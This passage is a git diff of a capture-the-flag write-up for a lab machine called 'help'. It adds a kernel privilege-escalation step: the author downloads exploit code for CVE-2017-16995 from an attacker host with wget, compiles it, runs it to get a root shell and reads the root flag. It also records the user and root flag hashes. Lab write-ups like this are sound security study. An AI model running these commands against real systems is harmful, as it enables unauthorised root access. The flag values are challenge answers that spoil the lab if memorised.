@@ -797,7 +797,7 @@ so looks like whatever we mail to, it gets to `help@ubuntu`
 ```
 help@help:~$ date
 Sat Jan  7 12:43:05 PST 2023
-help@help:~$ tail -f /var/log/exim4/mainlog 
+help@help:~$ tail -f /var/log/exim4/mainlog
 2023-01-07 10:54:51 1pEELD-00054E-Jl Completed
 2023-01-07 10:57:53 Start queue run: pid=19560
 2023-01-07 10:57:53 End queue run: pid=19560
@@ -835,8 +835,42 @@ help@help:~$ date
 Sat Jan  7 14:49:00 PST 2023
 ```
 
+### nope
+
+kernel exploits.
+
+```
+help@help:/var/www/html/support$ uname -a
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+CVE-2017-16995 gives us [44298.c](44298.c)
+```
+help@help:~$ wget http://10.10.14.13:8000/44298.c
+--2023-01-07 15:11:14--  http://10.10.14.13:8000/44298.c
+Connecting to 10.10.14.13:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5789 (5.7K) [text/plain]
+Saving to: ‘44298.c’
+
+44298.c                                        100%[=====================================================================================================>]   5.65K  --.-KB/s    in 0.006s
+
+2023-01-07 15:11:14 (893 KB/s) - ‘44298.c’ saved [5789/5789]
+
+help@help:~$ gcc 44298.c
+help@help:~$ ./a.out
+task_struct = ffff8800369a2a80
+uidptr = ffff88003a81fc84
+spawning root shell
+root@help:~# id -a
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
+root@help:~# cat /root/root.txt
+1bce6a4b7614de25415d805d140bbdfc
+
+```
+
 ## flag
 ```
-user:
-root:
+user:dfcaec4d0252928bdee1dae4d9f55b88
+root:1bce6a4b7614de25415d805d140bbdfc
 ```
